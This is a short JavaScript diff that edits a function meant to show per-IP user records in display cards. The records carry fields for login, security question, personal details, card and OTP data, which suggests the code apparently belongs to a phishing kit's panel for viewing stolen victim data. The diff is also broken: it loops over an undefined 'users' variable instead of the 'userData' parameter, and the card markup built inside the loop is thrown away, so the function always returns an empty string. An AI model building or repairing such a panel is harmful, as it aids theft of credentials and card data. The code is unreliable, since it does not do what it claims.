@@ -153,7 +153,9 @@ function updateActiveUserCount(newCount) {
 function formatUserDataForDisplay(userData) {
   // Format the user data for display in the modal
   // Placeholder function - implement according to your needs
-  userData.forEach(([ipAddress, details]) => {
+  users.forEach(user => {
+    if (Array.isArray(user) && user.length === 2) {
+      const [ipAddress, details] = user;
       if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
 
         return `   <div class="card">
@@ -196,8 +198,10 @@ function formatUserDataForDisplay(userData) {
       } else {
         return `No result for IP: ${ipAddress}`;
       }
-    
-  })
+    } else {
+      console.error('Invalid user data format:', user);
+    }
+  });
   return '';
 }
 
